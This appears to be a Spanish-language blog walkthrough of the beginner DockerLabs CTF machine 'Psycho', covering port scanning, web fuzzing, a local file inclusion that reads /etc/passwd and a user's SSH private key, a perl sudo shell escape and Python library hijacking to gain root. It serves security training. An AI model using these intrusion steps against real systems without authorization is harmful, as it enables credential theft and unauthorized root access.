---
title: "PSYCHO DOCKERLABS"
date: 2025-05-18 10:00:00 +0000
categories: [DockerLabs]
tags: [DockerLabs, CTF]
image: /assets/img/DockerLabs/MachinePsycho/machine.png
---



La máquina Psycho de la plataforma DockerLabs es un reto de nivel fácil orientado a quienes están comenzando en el mundo del pentesting.
Es ideal para reforzar conocimientos sobre análisis de puertos, fuzzing, técnicas de enumeración web, y uso de herramientas comunes como Nmap, Gobuster, Wfuzz y GTFObins.



## INFORMACIÓN GENERAL

- **Plataforma**: Dockerlabs
- **Sistema Operativo**: Linux
- **Dificultad**: Fácil


## DESPLIEGUE
```bash
bash auto_deploy.sh psycho.tar
```
![despliegue](/assets/img/DockerLabs/MachinePsycho/despliegue.png)

## RECONOCIMIENTO
```bash
nmap -p- -sS --min-rate 5000 -vvvv -n -Pn -sCV 172.17.0.2 -oN ports
```
```bash
# Nmap 7.94SVN scan initiated Sat Mar  1 20:14:56 2025 as: nmap -p- -sS --min-rate 5000 -vvvv -n -Pn -sCV -oN ports 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000013s latency).
Scanned at 2025-03-01 20:14:56 -05 for 8s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLmfDz6T3XGKWifPXb0JRYMnpBIhNV4en6M+lkDFe1l/+EjBi+8MtlEy6EFgPI9TZ7aTybt2qudKJ8+r3wcsi8w=
|   256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHtGVi9ya8KY3fjIqNDQcC9RuW20liVFDd+uUEgllPzQ
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: 4You
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar  1 20:15:04 2025 -- 1 IP address (1 host up) scanned in 8.82 seconds
```
## ENUMERACION
![weberro](/assets/img/DockerLabs/MachinePsycho/PAGINA_ERROR.png)

Podemos fijarnos que hay un mensaje en la parte izquiera final de la web, indicando un error, como si una solicitud se estuviera tramitando mal
ya esto nos recuerda un poco a la Vulnerabilidad de LFI, realizaremos una fuerza bruta para descubrir directorios con gobuster

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml,csv,txt,html -t 20 -b 500,502,404
```
![gobuster](/assets/img/DockerLabs/MachinePsycho/gobuster.png)

Vemos que tenemos una carpetita `assets`, si sapeamos es una imagen, eh aplicado esteganografia para ver si hay data oculta pero no hay nada

![assets](/assets/img/DockerLabs/MachinePsycho/assets.png)

index.php nos dirige a la misma web, entonces vamos a aplicar un Fuzzing para ver si descubrimos un parametro y explotar un posible LFI
```bash
wfuzz -c --hc=404,500 --hw=169 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://172.17.0.2/index.php?FUZZ=whoami'
```
![Wfuzz](/assets/img/DockerLabs/MachinePsycho/wfuzz.png)
## EXPLOTACION
Como vemos tenemos un parámetro secret incluido en el index.php, vamos a la URL modificamos y tratamos de leer el `/etc/passwd` y bingo
tenemos 2 Usuarios que son: vaxei y luisillo 

![users](/assets/img/DockerLabs/MachinePsycho/users.jpg)

Entonces la unica forma que tenemos de aprovechar un inicio de sesión por ssh es con el id_rsa de los usuarios, pero para esto se tiene que apicar un Path Transversal porque asi nomas no deja y ojo: eh buscado el id_rsa del user Luisillo y no hay, solo se encuentra el de user vaxei

![id_rsa_vaxei](/assets/img/DockerLabs/MachinePsycho/id_rsa_vaxei.png)

extraemos el id_rsa y copiamos en un archivo que crearemos en nuestra maquina atacante, IMPORTANTE: darle permiso `chmod 600 id_rsa`

![permisos_id_rsa](/assets/img/DockerLabs/MachinePsycho/permisos_id_rsa.png)

```bash
ssh -i id_rsa vaxei@172.17.0.2
```
![login_vaxei](/assets/img/DockerLabs/MachinePsycho/login_vaxei.png)

## ESCALADA DE PRIVILEGIOS
La manera mas sencilla hacer 
```bash
sudo -l
```
si no, podemos aprovechar permisos SUID pero este no es el caso, podemos observar que el usuario Luisillo puede ejecutar `/usr/bin/perl`, es decir nos convertiremos primero en luisillo para luego escalar a root

![gtfobins](/assets/img/DockerLabs/MachinePsycho/gtfobins.png)

```bash
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash";'
```
![luisillo](/assets/img/DockerLabs/MachinePsycho/luisillo.png)

Volvemos a realizar un `sudo -l` con el usuario luisillo y vemos que podemos ejecutar comandos con todos los permisos pero en un solo archivo específico

![pivi_luisillo](/assets/img/DockerLabs/MachinePsycho/privi_luisillo.png)



al poder ver el contenido del archivo ``paw.py`, podemos aplicar una tecnica llamada *Python Library Jihacking*, para poder secuestrar una libreria y al 
momento de ejecutar el script, se ecute el script llamado igual que la libreria y ganar acceso

![subprocess](/assets/img/DockerLabs/MachinePsycho/subprocess.png)


ejecutamos el paw.py y hemos ganado acceso como root

![root](/assets/img/DockerLabs/MachinePsycho/root.png)


# ELIMINAR LA MAQUINA
```bash
Ctrl + C
```

# GRACIAS POR LEER